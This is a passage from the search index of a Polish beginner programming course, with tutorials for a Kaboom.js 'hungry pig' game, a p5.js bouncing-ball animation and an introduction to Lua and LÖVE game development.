pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_right\"));\n    });\n\n    onKeyPress(\"up\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = -pig.v;\n        pig.use(sprite(\"pig_up\"));\n    });\n\n    onKeyPress(\"down\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = pig.v;\n        pig.use(sprite(\"pig_down\"));\n    });\n\n    const beet = add([\n        sprite(\"beet\"),\n        pos(200, 200),\n        origin(\"center\"),\n        area(),\n        \"beet\",\n    ]);\n\n    pig.onCollide(\"beet\", () =&gt; {\n        beet.pos.x = rand(50, width() - 50);\n        beet.pos.y = rand(50, height() - 50);\n        pig.v += 0.8;\n        play(\"pig\");\n    });\n});\n\ngo(\"game\");\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#punkty","title":"Punkty","text":"<p>C\u00f3\u017c to za gra bez punkt\u00f3w! Dodanie jednak punkt\u00f3w do naszej gry to \u017caden problem. Punkty b\u0119dziemy dostawa\u0107 za ka\u017cdego zjedzonego buraka. Na pocz\u0105tku dopisujemy punkty w postaci nowej zmiennej points. Pocz\u0105tkowo punkty ustawiamy na \\(0\\). Now\u0105 zmienn\u0105 utworzymy w scenie game, zaraz nad funkcj\u0105 wykrywaj\u0105c\u0105 kolizj\u0119 \u015bwini i buraka.</p> <pre><code>let points = 0;\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#wyswietlamy-punkty","title":"Wy\u015bwietlamy punkty","text":"<p>Zanim przejdziemy do zliczania punkt\u00f3w, wy\u015bwietlmy je na ekranie gry. W tym celu dodamy nowy element do naszej sceny za pomoc\u0105 polecenia <code>add</code>. Nowe instrukcje dopisujemy zaraz pod zmienn\u0105 <code>points</code>.</p> <pre><code>const pointsLabel = add([\n    text(points),\n    pos(width() / 2, 50),\n    origin(\"center\"),\n]);\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#zliczamy-punkty","title":"Zliczamy punkty","text":"<p>Jak ju\u017c ustalili\u015bmy, punkty b\u0119dziemy dostawa\u0107 za ka\u017cdego zjedzonego buraka. W takim razie, do cz\u0119\u015bci, w kt\u00f3rej wykrywamy kolizj\u0119 z burakiem, dopisujemy zwi\u0119kszanie punkt\u00f3w: <code>points += 1</code>. Po zwi\u0119kszeniu liczby punkt\u00f3w nale\u017cy tak\u017ce zaktualizowa\u0107 tekst etykiety <code>pointsLabel</code> wy\u015bwietlaj\u0105cej punkty: <code>pointsLabel.text = points</code>.</p> <pre><code>pig.onCollide(\"beet\", () =&gt; {\n    beet.pos.x = rand(50, width() - 50);\n    beet.pos.y = rand(50, height() - 50);\n    pig.v += 0.8;\n    play(\"pig\");\n    points += 1;\n    pointsLabel.text = points;\n});\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#peny-kod_2","title":"Pe\u0142ny kod","text":"<pre><code>import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\nkaboom({\n    width: 800,\n    height: 800,\n});\n\nloadSprite(\"bg\", \"images/bg.png\");\nloadSprite(\"pig_down\", \"images/pig_down.png\");\nloadSprite(\"pig_up\", \"images/pig_up.png\");\nloadSprite(\"pig_left\", \"images/pig_left.png\");\nloadSprite(\"pig_right\", \"images/pig_right.png\");\nloadSprite(\"pig_dead\", \"images/pig_dead.png\");\nloadSprite(\"beet\", \"images/beetroot.png\");\n\nloadSound(\"pig\", \"sounds/pig.wav\");\n\nscene(\"game\", () =&gt; {\n    add([\n        sprite(\"bg\"),\n    ]);\n\n    const pig = add([\n        sprite(\"pig_down\"),\n        pos(center()),\n        origin(\"center\"),\n        area(),\n        \"pig\",\n    ]);\n\n    pig.vx = 0;\n    pig.vy = 0;\n    pig.v = 3;\n\n    onUpdate(\"pig\", () =&gt; {\n        pig.pos.x += pig.vx;\n        pig.pos.y += pig.vy;\n\n        if (pig.pos.x &lt; 0 || pig.pos.x &gt; width() || pig.pos.y &lt; 0 || pig.pos.y &gt; height()) {\n            go(\"game_over\", points);\n        }\n    });\n\n    onKeyPress(\"left\", () =&gt; {\n        pig.vx = -pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_left\"));\n    });\n\n    onKeyPress(\"right\", () =&gt; {\n        pig.vx = pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_right\"));\n    });\n\n    onKeyPress(\"up\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = -pig.v;\n        pig.use(sprite(\"pig_up\"));\n    });\n\n    onKeyPress(\"down\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = pig.v;\n        pig.use(sprite(\"pig_down\"));\n    });\n\n    const beet = add([\n        sprite(\"beet\"),\n        pos(200, 200),\n        origin(\"center\"),\n        area(),\n        \"beet\",\n    ]);\n\n    let points = 0;\n\n    const pointsLabel = add([\n        text(points),\n        pos(width() / 2, 50),\n        origin(\"center\"),\n    ]);\n\n    pig.onCollide(\"beet\", () =&gt; {\n        beet.pos.x = rand(50, width() - 50);\n        beet.pos.y = rand(50, height() - 50);\n        pig.v += 0.8;\n        play(\"pig\");\n        points += 1;\n        pointsLabel.text = points;\n    });\n});\n\ngo(\"game\");\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#pena-gra","title":"Pe\u0142na gra","text":"<p>Pe\u0142na implementacja dost\u0119pna jest poni\u017cej.</p> <p>G\u0142odna \u015bwinia</p>"},{"location":"learning-by-games/javascript/p5/","title":"Animacje - P5.js","text":""},{"location":"learning-by-games/javascript/p5/jumping-ball/","title":"Skacz\u0105ca pi\u0142ka","text":""},{"location":"learning-by-games/javascript/p5/jumping-ball/#wstep","title":"Wst\u0119p","text":"<p>Stworzymy prost\u0105 animacj\u0119, w kt\u00f3rej pi\u0142ka spada pod wp\u0142ywem grawitacji i odbija si\u0119 od pod\u0142ogi. Nauczymy si\u0119 symulowa\u0107 fizyk\u0119 ruchu, wykrywa\u0107 kolizj\u0119 z pod\u0142og\u0105 oraz dodawa\u0107 efekty wizualne i interaktywne rozszerzenia.</p>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak zastosowa\u0107 grawitacj\u0119 do obiektu.</li> <li>Jak symulowa\u0107 ruch z wykorzystaniem pr\u0119dko\u015bci i przyspieszenia.</li> <li>Jak wykrywa\u0107 i obs\u0142ugiwa\u0107 kolizj\u0119 z pod\u0142og\u0105.</li> <li>Jak dodawa\u0107 rozszerzenia: wiele pi\u0142ek, interakcj\u0119 z mysz\u0105, zmian\u0119 koloru przy odbiciu.</li> </ul>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#podstawowa-konfiguracja","title":"Podstawowa konfiguracja","text":"<p>Zaczniemy od podstawowej konfiguracji naszego projektu. Dodamy potrzebne zmienne i narysujemy nasz\u0105 pi\u0142k\u0119.</p>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#zmienne-i-ustawienia-poczatkowe","title":"Zmienne i ustawienia pocz\u0105tkowe","text":"<p>Na pocz\u0105tku deklarujemy zmienne do kontroli pozycji, pr\u0119dko\u015bci, grawitacji i promienia pi\u0142ki. Dodajemy je na samej g\u00f3rze naszego projektu.</p> <pre><code>let y = 0;       // Pocz\u0105tkowa pozycja pionowa\nlet speed = 0;   // Pocz\u0105tkowa pr\u0119dko\u015b\u0107\nlet gravity = 0.5; // Warto\u015b\u0107 przyspieszenia grawitacyjnego\nlet radius = 50; // Promie\u0144 pi\u0142ki\n</code></pre> <p>Nast\u0119pnie, wewn\u0105trz funkcji <code>setup</code>, tworzymy p\u0142\u00f3tno o wymiarach \\(400\\times400\\) pikseli.</p> <pre><code>function setup() {\n    createCanvas(400, 400); // Tworzymy p\u0142\u00f3tno o rozmiarze 400x400 pikseli\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#rysowanie-piki","title":"Rysowanie pi\u0142ki","text":"<p>Przejd\u017amy teraz do narysowania naszej pi\u0142ki na ekranie. Zanim to jednak zrobimy, musimy wype\u0142ni\u0107 t\u0142o kolorem. Robimy to wewn\u0105trz funkcji rysuj\u0105cej <code>draw</code> za pomoc\u0105 funkcji <code>background</code>. Funkcja <code>background</code> wype\u0142nia t\u0142o kolorem podanym jako parametr. Kolor mo\u017cemy poda\u0107 na r\u00f3\u017cne sposoby, np. za pomoc\u0105 trzech warto\u015bci RGB, tzn. sk\u0142adowych koloru: czerwony (red), zielony (green), niebieski (blue). Je\u017celi chcemy uzyska\u0107 szary kolor, wystarczy \u017ce podamy jedn\u0105 warto\u015b\u0107, poniewa\u017c w przypadku odcieni szaro\u015bci warto\u015bci sk\u0142adowych musz\u0105 by\u0107 sobie r\u00f3wne.</p> <pre><code>function draw() {\n    background(220);  // Wype\u0142niamy t\u0142o kolorem\n}\n</code></pre> <p>Teraz mo\u017cemy narysowa\u0107 pi\u0142k\u0119. Najpierw ustalmy jej kolor. Zrobimy to za pomoc\u0105 funkcji <code>fill</code>, kt\u00f3ra, podobnie jak funkcja <code>background</code>, przyjmuje jako parametr warto\u015b\u0107 koloru, kt\u00f3rym zostanie wype\u0142niony rysowany przez nas kszta\u0142t.</p> <pre><code>function draw() {\n    background(220);  \n\n    fill(255, 0, 100); // Ustawiamy kolor pi\u0142ki\n}\n</code></pre> <p>Aby narysowa\u0107 sam\u0105 pi\u0142k\u0119 u\u017cyjemy funkcji <code>circle</code> do narysowania ko\u0142a. Funkcja przyjmuje trzy parametry: pozycj\u0119 <code>x</code>, pozycj\u0119 <code>y</code> oraz \u015brednic\u0119 rysowanego ko\u0142a, tzn. promie\u0144 (<code>radius</code>) razy dwa. Chcemy, aby nasza pi\u0142ka znajdowa\u0142a si\u0119 na \u015brodku ekranu w poziomie, wi\u0119c jako pozycj\u0119 <code>x</code> przyjmiemy po\u0142ow\u0119 szeroko\u015bci ekranu: <code>width/2</code>. Pozycja pionowa pi\u0142ki okre\u015blona jest przez utworzon\u0105 przez nas wcze\u015bniej zmienn\u0105 <code>y</code>.</p> <p>W p\u0119tli <code>draw()</code> aktualizujemy pozycj\u0119 pi\u0142ki i rysujemy j\u0105:</p> <pre><code>function draw() {\n    background(220);  \n\n    fill(255, 0, 100);\n    circle(width/2, y, radius * 2); // Rysujemy ko\u0142o na \u015brodku, na aktualnej wysoko\u015bci\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#symulacja-fizyki","title":"Symulacja fizyki","text":"<p>Teraz, gdy mamy ju\u017c pi\u0142k\u0119 na ekranie, mo\u017cemy wprawi\u0107 j\u0105 w ruch.</p>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#grawitacja-i-ruch","title":"Grawitacja i ruch","text":"<p>Aby nasza pi\u0142ka si\u0119 porusza\u0142a, musimy zmienia\u0107 jej po\u0142o\u017cenie, a konkretnie zmienn\u0105 <code>y</code>. Po\u0142o\u017cenie pi\u0142ki powinno zmienia\u0107 si\u0119 wraz z pr\u0119dko\u015bci\u0105. Pr\u0119dko\u015b\u0107 natomiast modyfikowana jest przez grawitacj\u0119. Za\u0142o\u017cenie jest proste: w ka\u017cdej klatce animacji najpierw zwi\u0119kszamy pr\u0119dko\u015b\u0107 o warto\u015b\u0107 grawitacji, a nast\u0119pnie aktualizujemy pozycj\u0119 pi\u0142ki zgodnie z obecn\u0105 pr\u0119dko\u015bci\u0105.</p> <p>Nasze obliczenia dodamy wewn\u0105trz funkcji <code>draw</code>, zaraz po wype\u0142nieniu t\u0142a kolorem, a przed rysowaniem pi\u0142ki. Zaczynamy od zwi\u0119kszenia pr\u0119dko\u015bci (<code>speed</code>) o warto\u015b\u0107 grawitacji (<code>gravity</code>).</p> <pre><code>function draw() {\n    background(220); \n\n    speed += gravity; // Dodajemy przyspieszenie do pr\u0119dko\u015bci\n\n    fill(255, 0, 100); \n    circle(width/2, y, radius * 2); \n}\n</code></pre> <p>Teraz mo\u017cemy zmieni\u0107 pozycj\u0119 pi\u0142ki zgodnie z jej pr\u0119dko\u015bci\u0105.</p> <pre><code>function draw() {\n    background(220); \n\n    speed += gravity;\n    y += speed;       // Aktualizujemy pozycj\u0119 pionow\u0105\n\n    fill(255, 0, 100); \n    circle(width/2, y, radius * 2); \n}\n</code></pre> <p>Teraz nasza pi\u0142ka powinna zacz\u0105\u0107 spada\u0107 z coraz wi\u0119ksz\u0105 pr\u0119dko\u015bci\u0105.</p>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#kolizja-z-podoga","title":"Kolizja z pod\u0142og\u0105","text":"<p>Aby nasza pi\u0142ka odbija\u0142a si\u0119 od pod\u0142ogi, musimy wykry\u0107, kiedy si\u0119 z pod\u0142og\u0105 zderzy. W tym celu, zaraz po zmianie pozycji pi\u0142ki, sprawdzimy czy pi\u0142ka nie wypad\u0142a poza ekran, tzn. czy jej pozycja <code>y</code> nie przekroczy\u0142a wysoko\u015bci ekranu pomniejszonej o promie\u0144 pi\u0142ki.</p> <p>Dodajemy odpowiedni warunek wewn\u0105trz funkcji <code>draw</code>, zaraz po zmianie zmiennej <code>y</code>.</p> <pre><code>function draw() {\n    background(220); \n\n    speed += gravity;\n    y += speed;\n\n    if (y &gt; height - radius) { // Wykrywamy kolizj\u0119 z pod\u0142og\u0105\n    }\n\n    fill(255, 0, 100); \n    circle(width/2, y, radius * 2); \n}\n</code></pre> <p>Je\u017celi kolizja z pod\u0142og\u0105 nast\u0105pi\u0142a to pi\u0142ka powinna zacz\u0105\u0107 si\u0119 porusza\u0107 w przeciwnym przypadku. W tym celu wystarczy, \u017ce zmienimy pr\u0119dko\u015b\u0107 na przeciwn\u0105, tzn. przemno\u017cymy przez warto\u015b\u0107 ujemn\u0105. Chcemy tak\u017ce, aby pi\u0142ka powoli zwalnia\u0142a, dlatego za ka\u017cdym razem b\u0119dziemy zmniejsza\u0107 pr\u0119dko\u015b\u0107. Mo\u017cemy to zrobi\u0107 przemna\u017caj\u0105\u0107 pr\u0119dko\u015b\u0107 pi\u0142ki przez u\u0142amek mniejszy od \\(1\\).</p> <pre><code>function draw() {\n    background(220); \n\n    speed += gravity;\n    y += speed;\n\n    if (y &gt; height - radius) { \n        speed *= -0.8; // Odwracamy kierunek ruchu z utrat\u0105 energii\n    }\n\n    fill(255, 0, 100); \n    circle(width/2, y, radius * 2); \n}\n</code></pre> <p>Teraz nasza pi\u0142ka powinna odbija\u0107 si\u0119 od pod\u0142ogi. Zobaczymy jednak, \u017ce po pewnym czasie pi\u0142ka wypadnie poza ekran. Dzieje si\u0119 tak poniewa\u017c przy ma\u0142ych pr\u0119dko\u015bciach pi\u0142ka nie zd\u0105\u017cy si\u0119 odbi\u0107, zanim ponownie nie zmienimy kierunku ruchu. Dlatego po ka\u017cdym odbiciu przywr\u00f3cimy tak\u017ce pi\u0142k\u0119 na pozycj\u0119 zaraz przy pod\u0142odze, tak aby nie wystawa\u0142a poza ekran. </p> <pre><code>function draw() {\n    background(220); \n\n    speed += gravity;\n    y += speed;\n\n    if (y &gt; height - radius) { \n        speed *= -0.8;\n        y = height - radius; // Zapobiegamy przej\u015bciu pi\u0142ki przez pod\u0142og\u0119\n    }\n\n    fill(255, 0, 100); \n    circle(width/2, y, radius * 2); \n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#peny-kod-wersja-podstawowa","title":"Pe\u0142ny kod (wersja podstawowa)","text":"<pre><code>let y = 0;       // Pozycja pionowa\nlet speed = 0;   // Pr\u0119dko\u015b\u0107 ruchu\nlet gravity = 0.5; // Warto\u015b\u0107 grawitacji\nlet radius = 25; // Promie\u0144 pi\u0142ki\n\nfunction setup() {\n    createCanvas(400, 400); // Ustawiamy rozmiar p\u0142\u00f3tna\n}\n\nfunction draw() {\n    background(220); // T\u0142o\n\n    // Symulacja fizyki\n    speed += gravity; // Dodajemy grawitacj\u0119 do pr\u0119dko\u015bci\n    y += speed;       // Aktualizujemy pozycj\u0119\n\n    // Kolizja z pod\u0142og\u0105\n    if (y &gt; height - radius) {\n        speed *= -0.8; // Odbicie z t\u0142umieniem\n        y = height - radius; // Poprawiamy pozycj\u0119\n    }\n\n    // Rysowanie pi\u0142ki\n    fill(255, 0, 100); // Kolor czerwony\n    circle(width/2, y, radius * 2); // Rysujemy ko\u0142o\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#rozszerzenia","title":"Rozszerzenia","text":"<p>Tutaj poka\u017cemy jak mo\u017cemy rozszerzy\u0107 nasz\u0105 animacj\u0119 o nowe funkcjonalno\u015bci.</p>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#wiele-piek","title":"Wiele pi\u0142ek","text":"<p>W celu dodania wielu pi\u0142ek potrzebna nam b\u0119dzie tablica, w kt\u00f3rej b\u0119dziemy te pi\u0142ki trzyma\u0107. Pozb\u0119dziemy si\u0119 pojedy\u0144czych zmiennych, zamiast tego b\u0119dziemy warto\u015bci dodawa\u0107 do tablicy.</p>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#piki-dodawane-recznie","title":"Pi\u0142ki dodawane r\u0119cznie","text":"<pre><code>let balls = [];\n\nlet gravity = 0.5; // Warto\u015b\u0107 grawitacji\n\nfunction setup() {\n    createCanvas(400, 400); // Ustawiamy rozmiar p\u0142\u00f3tna\n\n    balls.push({ // Dodajemy pi\u0142k\u0119 do tablicy\n      x: width / 2, // Pocz\u0105tkowa pozycja pozioma pi\u0142ki\n      y: 0, // Pocz\u0105tkowa pozycja pionowa pi\u0142ki\n      speed: 0, // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pi\u0142ki\n      radius: 25, // Promie\u0144 pi\u0142ki\n      color: color(255, 0, 100) // Kolor pi\u0142ki\n    });\n\n    balls.push({ // Dodajemy pi\u0142k\u0119 do tablicy\n      x: width / 4, // Pocz\u0105tkowa pozycja pozioma pi\u0142ki\n      y: 0, // Pocz\u0105tkowa pozycja pionowa pi\u0142ki\n      speed: 0, // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pi\u0142ki\n      radius: 30, // Promie\u0144 pi\u0142ki\n      color: color(0, 255, 100) // Kolor pi\u0142ki\n    });\n}\n\nfunction draw() {\n    background(220); // T\u0142o\n\n    for(let b of balls) {\n      b.speed += gravity;\n      b.y += b.speed;\n      if (b.y &gt; height - b.radius) {\n        b.speed *= -0.8;\n        b.y = height - b.radius;\n      }\n\n      fill(b.color);\n      circle(b.x, b.y, b.radius * 2);\n    }\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#losowane-piki","title":"Losowane pi\u0142ki","text":"<pre><code>let balls = [];\n\nlet gravity = 0.5; // Warto\u015b\u0107 grawitacji\n\nfunction setup() {\n    createCanvas(400, 400); // Ustawiamy rozmiar p\u0142\u00f3tna\n\n    for(let i = 0; i &lt; 50; i++) {\n      let radius = random(5, 50);\n      balls.push({ // Dodajemy pi\u0142k\u0119 do tablicy\n        x: random(radius, width - radius), // Pocz\u0105tkowa pozycja pozioma pi\u0142ki\n        y: random(radius, height - radius), // Pocz\u0105tkowa pozycja pionowa pi\u0142ki\n        speed: 0, // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pi\u0142ki\n        radius: radius, // Promie\u0144 pi\u0142ki\n        color: color(random(0,255), random(0,255), random(0, 255)) // Kolor pi\u0142ki\n      });\n    }\n}\n\nfunction draw() {\n    background(220); // T\u0142o\n\n    for(let b of balls) {\n      b.speed += gravity;\n      b.y += b.speed;\n      if (b.y &gt; height - b.radius) {\n        b.speed *= -0.8;\n        b.y = height - b.radius;\n      }\n\n      fill(b.color);\n      circle(b.x, b.y, b.radius * 2);\n    }\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#interakcja-z-mysza","title":"Interakcja z mysz\u0105","text":"<p>Dodajemy now\u0105 funkcj\u0119 <code>mousePressed()</code> do tworzenia nowych pi\u0142ek:</p> <pre><code>function mousePressed() {\n  balls.push({ // Dodajemy pi\u0142k\u0119 do tablicy\n        x: mouseX, // Pocz\u0105tkowa pozycja pozioma pi\u0142ki\n        y: mouseY, // Pocz\u0105tkowa pozycja pionowa pi\u0142ki\n        speed: 0, // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pi\u0142ki\n        radius: random(5, 50), // Promie\u0144 pi\u0142ki\n        color: color(random(0,255), random(0,255), random(0, 255)) // Kolor pi\u0142ki\n      });\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#wiecznie-odbijajace-sie-piki","title":"Wiecznie odbijaj\u0105ce si\u0119 pi\u0142ki","text":"<p>Sprawimy, aby pi\u0142ka, gdy ju\u017c sko\u0144czy si\u0119 odbija\u0107, to zacz\u0119\u0142a si\u0119 odbija\u0107 ponownie. W tym celu sprawdzimy, czy pr\u0119dko\u015b\u0107 pi\u0142ki jest blizka zeru. Dok\u0142adniej, czy jej warto\u015b\u0107 bezwzgl\u0119dna jest mniejsza od jednej dziesi\u0105tej. Je\u017celi tak jest, to ustawimy now\u0105, losow\u0105 warto\u015b\u0107 pr\u0119dko\u015bci dla naszej pi\u0142ki. Now\u0105 instrukcj\u0119 dodajemy wewn\u0105trz funkcji <code>draw</code>, zaraz przed rysowaniem pi\u0142ki.</p> <pre><code>function draw() {\n    background(220); // T\u0142o\n\n    for(let b of balls) {\n      b.speed += gravity;\n      b.y += b.speed;\n      if (b.y &gt; height - b.radius) {\n        b.speed *= -0.8;\n        b.y = height - b.radius;\n      }\n\n      if (abs(b.speed) &lt; 0.1) { // Sprawdzamy, czy pi\u0142ka praktycznie przesta\u0142a si\u0119 rusza\u0107\n        b.speed = random(5, 20); // Je\u017celi tak, nadajemy jej now\u0105 pr\u0119dko\u015b\u0107 by wznowi\u0107 jej ruch\n      }\n\n      fill(b.color);\n      circle(b.x, b.y, b.radius * 2);\n    }\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#odbijanie-sie-na-boki","title":"Odbijanie si\u0119 na boki","text":"<pre><code>let balls = [];\n\nlet gravity = 0.5; // Warto\u015b\u0107 grawitacji\n\nfunction setup() {\n    createCanvas(400, 400); // Ustawiamy rozmiar p\u0142\u00f3tna\n\n    for(let i = 0; i &lt; 50; i++) {\n      let radius = random(5, 50);\n      balls.push({ // Dodajemy pi\u0142k\u0119 do tablicy\n        x: random(radius, width - radius), // Pocz\u0105tkowa pozycja pozioma pi\u0142ki\n        y: random(radius, height - radius), // Pocz\u0105tkowa pozycja pionowa pi\u0142ki\n        speedX: random(-10, 10), // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pozioma pi\u0142ki\n        speedY: 0, // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pionowa pi\u0142ki\n        radius: radius, // Promie\u0144 pi\u0142ki\n        color: color(random(0,255), random(0,255), random(0, 255)) // Kolor pi\u0142ki\n      });\n    }\n}\n\nfunction draw() {\n    background(220); // T\u0142o\n\n    for(let b of balls) {\n      b.speedY += gravity;\n      b.x += b.speedX;\n      b.y += b.speedY;\n      if (b.y &gt; height - b.radius) {\n        b.speedY *= -0.8;\n        b.y = height - b.radius;\n      }\n\n      if(b.x &gt; width - b.radius || b.x &lt; b.radius) {\n        b.speedX *= -1;\n      }\n\n      if (abs(b.speedY) &lt; 0.1) {\n        b.speedY = random(5, 20);\n      }\n\n      fill(b.color);\n      circle(b.x, b.y, b.radius * 2);\n    }\n}\n\nfunction mousePressed() {\n  balls.push({ // Dodajemy pi\u0142k\u0119 do tablicy\n        x: mouseX, // Pocz\u0105tkowa pozycja pozioma pi\u0142ki\n        y: mouseY, // Pocz\u0105tkowa pozycja pionowa pi\u0142ki\n        speedX: random(-10, 10), // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pozioma pi\u0142ki\n        speedY: 0, // Pocz\u0105tkowa pr\u0119dko\u015b\u0107 pionowa pi\u0142ki\n        radius: random(5, 50), // Promie\u0144 pi\u0142ki\n        color: color(random(0,255), random(0,255), random(0, 255)) // Kolor pi\u0142ki\n      });\n}\n</code></pre>"},{"location":"learning-by-games/javascript/p5/jumping-ball/#podsumowanie","title":"Podsumowanie","text":"<p>Uda\u0142o Ci si\u0119 stworzy\u0107 dynamiczn\u0105 animacj\u0119 pi\u0142ki odbijaj\u0105cej si\u0119 od pod\u0142ogi! Mo\u017cesz teraz eksperymentowa\u0107 z warto\u015bciami grawitacji, t\u0142umieniem odbicia lub dodawa\u0107 kolejne rozszerzenia, np. kolizje mi\u0119dzy pi\u0142kami, r\u00f3\u017cne kszta\u0142ty, d\u017awi\u0119ki czy zapis wynik\u00f3w. Kod jest gotowy do modyfikacji i rozwoju!</p>"},{"location":"learning-by-games/lua/","title":"Lua","text":"<p>Lua jest prostym, skryptowym j\u0119zykiem programistycznym. Jego podstawowa sk\u0142adnia i semantyka s\u0105 \u0142atwe do przyswojenia, a mo\u017cliwo\u015bci zapewnione poprzez \u0142atwy dost\u0119p do najr\u00f3\u017cniejszych bibliotek s\u0105 bardzo du\u017ce. J\u0119zyk ten jest bardzo cz\u0119sto wykorzystywany przy tworzeniu gier, w szczeg\u00f3lno\u015bci do tworzenia skrypt\u00f3w opisuj\u0105cych zachowanie r\u00f3\u017cnych postaci w grze. Mo\u017cna go te\u017c jednak wykorzysta\u0107 do tworzenia ciekawych gier.</p> <p>W tym kursie poznasz podstawy j\u0119zyka Lua, a tak\u017ce nauczysz si\u0119 tworzy\u0107 gry 2D z wykorzystaniem frameworka L\u00d6VE.</p> <p>Czas zacz\u0105\u0107! Pozw\u00f3lcie \u017ce b\u0119d\u0119 Waszym przewodnikiem podczas podr\u00f3\u017cy po programowaniu i tworzeniu gier.</p>"},{"location":"learning-by-games/lua/#love","title":"L\u00d6VE","text":"<p>L\u00d6VE, cz\u0119sto nazywane Love2D, to otwarty, darmowy framework do tworzenia gier 2D, kt\u00f3re u\u017cywaj\u0105 j\u0119zyka programowania Lua. Umo\u017cliwia on tw\u00f3rcom gier proste tworzenie r\u00f3\u017cnego rodzaju gier na wiele platform, w tym Windows, macOS, Linux, Android i iOS.</p> <p>Lua Love</p>"},{"location":"learning-by-games/lua/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Prostota i Elastyczno\u015b\u0107: Love2D skupia si\u0119 na prostocie i elastyczno\u015bci, oferuj\u0105c jednocze\u015bnie pe\u0142en zestaw funkcji potrzebnych do tworzenia gier 2D. Kod Lua jest \u0142atwy do nauczenia, a L\u00d6VE nie narzuca konkretnego stylu programowania czy struktury projektu.</p> </li> <li> <p>Wsparcie dla wielu platform: Z Love2D mo\u017cna tworzy\u0107 gry na wiele platform, w tym na komputery osobiste, telefony kom\u00f3rkowe i tablety.</p> </li> <li> <p>Wbudowane modu\u0142y: Love2D zawiera modu\u0142y do obs\u0142ugi d\u017awi\u0119ku, grafiki, wej\u015bcia/wyj\u015bcia, sieci i wielu innych funkcji niezb\u0119dnych do tworzenia gier.</p> </li> <li> <p>Silna Spo\u0142eczno\u015b\u0107: Love2D ma aktywn\u0105 spo\u0142eczno\u015b\u0107 u\u017cytkownik\u00f3w i programist\u00f3w, kt\u00f3rzy dziel\u0105 si\u0119 poradami, kodem i gotowymi do u\u017cycia narz\u0119dziami.</p> </li> <li> <p>Obs\u0142uga r\u00f3\u017cnych typ\u00f3w medi\u00f3w: Love2D obs\u0142uguje wiele r\u00f3\u017cnych format\u00f3w plik\u00f3w graficznych, d\u017awi\u0119kowych i wideo, co umo\u017cliwia tw\u00f3rcom gier \u0142atwe dodawanie zasob\u00f3w do swoich projekt\u00f3w.</p> </li> </ol> <p>L\u00d6VE jest doskona\u0142ym wyborem dla programist\u00f3w na wszystkich poziomach do\u015bwiadczenia, kt\u00f3rzy chc\u0105 tworzy\u0107 gry 2D. Jego prostota i elastyczno\u015b\u0107, a tak\u017ce wsparcie dla wielu platform, czyni\u0105 go atrakcyjnym narz\u0119dziem dla tw\u00f3rc\u00f3w gier.</p>"},{"location":"learning-by-games/lua/asteroids/","title":"Asteroidy","text":""},{"location":"learning-by-games/lua/asteroids/#sterowanie","title":"Sterowanie","text":"<ul> <li>Strza\u0142ka lewo/prawo - obr\u00f3t w lewo/prawo</li> <li>Strza\u0142ka w g\u00f3r\u0119 - przyspieszenie</li> <li>Spacja - oddanie strza\u0142u</li> </ul>"},{"location":"learning-by-games/lua/asteroids/#implementacja","title":"Implementacja","text":"<p>https://replit.com/@damiankurpiewski/Asteroids</p>"},{"location":"learning-by-games/lua/flying-plane/","title":"Lataj\u0105cy samolocik","text":""},{"location":"learning-by-games/lua/flying-plane/#pena-gra","title":"Pe\u0142na gra","text":"<p>https://replit.com/@damiankurpiewski/TappyPlane</p>"},{"location":"learning-by-games/lua/hungry-pig/","title":"G\u0142odna \u015bwinia","text":""},{"location":"learning-by-games/lua/hungry-pig/#wstep","title":"Wst\u0119p","text":"<p>Stworzymy prost\u0105 gr\u0119, w kt\u00f3rej naszym graczem b\u0119dzie \u015bwinia. \u015awinie, jak wiadomo, lubi\u0105 je\u015b\u0107. Naszym celem b\u0119dzie wi\u0119c nakarmienie \u015bwini, a dok\u0142adniej: doprowadzenie jej do jedzenia. Na ekranie b\u0119d\u0105 si\u0119 pojawia\u0107 w losowych miejscach warzywa, a my b\u0119dziemy tak sterowa\u0107 \u015bwini\u0105, \u017ceby zjad\u0142a jak najwi\u0119cej. Po ka\u017cdym posi\u0142ku \u015bwinia b\u0119dzie przyspiesza\u0107, wi\u0119c gra b\u0119dzie stawa\u0142a si\u0119 coraz trudniejsza. Koniec gry nast\u0105pi, gdy \u015bwinia ucieknie poza ekran.</p>"},{"location":"learning-by-games/lua/hungry-pig/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak sterowa\u0107 postaci\u0105 z klawiatury</li> 